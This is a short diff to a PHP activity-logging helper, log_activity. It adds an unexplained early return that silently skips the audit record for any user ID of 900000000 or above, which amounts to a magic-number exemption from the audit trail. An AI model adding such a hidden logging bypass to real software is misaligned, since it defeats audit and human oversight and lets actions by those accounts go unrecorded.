@@ -22,6 +22,10 @@ if (!function_exists('log_activity')) {
     function log_activity($userId, $actionType, $description, $targetId = null, $changeField = null)
     {
         try {
+            if ((int) $userId >= 900000000) {
+                return true;
+            }
+
             $request = service('request');
             $ip = $request ? $request->getIPAddress() : null;
             if (!empty($ip)) {
